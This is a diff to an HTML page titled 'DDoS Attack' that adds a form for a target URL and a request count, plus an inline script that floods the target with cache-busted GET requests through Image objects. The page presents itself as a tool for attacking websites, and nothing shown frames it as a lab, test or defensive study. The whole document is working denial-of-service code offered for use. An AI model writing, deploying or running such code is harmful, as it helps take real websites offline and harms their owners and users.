@@ -3,16 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DDoS Attack Page</title>
+    <title>DDoS Attack</title>
+    <script>
+        // Function to launch a DDoS attack
+        function launchDDoS() {
+            // Get the target URL and number of requests from the user
+            let targetURL = document.getElementById("targetURL").value;
+            let numRequests = parseInt(document.getElementById("numRequests").value);
+
+            // Validate input
+            if (!targetURL || !numRequests || isNaN(numRequests) || numRequests <= 0) {
+                alert("Please enter a valid target URL and a positive integer for the number of requests.");
+                return;
+            }
+
+            // Launch the DDoS attack
+            for (let i = 0; i < numRequests; i++) {
+                // Create an image element to make a GET request
+                let img = new Image();
+                
+                // Generate a random parameter to bypass caching
+                let randomParam = "param" + Math.floor(Math.random() * 1000000);
+                
+                // Set the image source to the target URL with a random parameter
+                img.src = targetURL + "?" + randomParam;
+            }
+
+            // Display a message indicating that the attack has been launched
+            console.log("DDoS attack launched successfully. Target: " + targetURL + ", Number of requests: " + numRequests);
+        }
+    </script>
 </head>
 <body>
-    <h1>DDoS Attack Page</h1>
-    <p>This page contains a script to launch a DDoS attack on a target website.</p>
-
-    <!-- Include the main script file -->
-    <script src="main.js"></script>
-
-    <!-- Include the thread script file -->
-    <script src="thread.js"></script>
+    <h1>DDoS Attack</h1>
+    <p>This page allows you to launch a DDoS attack on a target website.</p>
+    <form>
+        <label for="targetURL">Target URL:</label><br>
+        <input type="text" id="targetURL" name="targetURL" placeholder="Enter the target URL"><br><br>
+        
+        <label for="numRequests">Number of Requests:</label><br>
+        <input type="number" id="numRequests" name="numRequests" placeholder="Enter the number of requests"><br><br>
+        
+        <button type="button" onclick="launchDDoS()">Launch DDoS Attack</button>
+    </form>
 </body>
 </html>
